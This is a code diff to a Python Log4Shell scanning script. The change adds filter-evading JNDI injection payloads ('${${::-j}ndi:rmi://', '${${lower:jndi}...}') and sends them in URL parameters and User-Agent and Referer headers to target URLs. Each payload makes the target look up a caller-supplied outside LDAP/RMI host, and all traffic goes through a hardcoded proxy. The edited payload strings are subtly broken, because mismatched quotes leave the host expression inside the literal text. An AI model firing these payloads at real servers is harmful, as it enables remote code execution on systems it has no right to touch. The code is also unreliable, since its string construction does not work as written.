@@ -6,16 +6,17 @@ from concurrent.futures import ThreadPoolExecutor
 disable_warnings()
 
 proxies = {}
-# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+proxies = {"http": "http://192.168.0.109:8080", "https": "http://192.168.0.109:8080"}
 
 def sendDetectionRequest(url, urlId):
     try:
-        payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'
-        params = {'id':payload}
-        headers = {'User-Agent':payload, 'Referer':payload}
-        url = url.strip()
-        print('[{}] Testing {}'.format(urlId, url))
-        get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
+        payload = ["${jndi:ldap://' + argv[2] + '/a}'","'${${::-j}ndi:rmi://'+ argv[2] +'/ass}'","'${${lower:jndi}:${lower:rmi}://'+argv[2]+'/poc}'"]
+        for payl in payload:
+            params = {'id':payl}
+            headers = {'User-Agent':payl, 'Referer':payl}
+            url = url.strip()
+            print('[{}] Testing {}'.format(urlId, url))
+            get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
     except Exception as e:
         print(e)
         pass
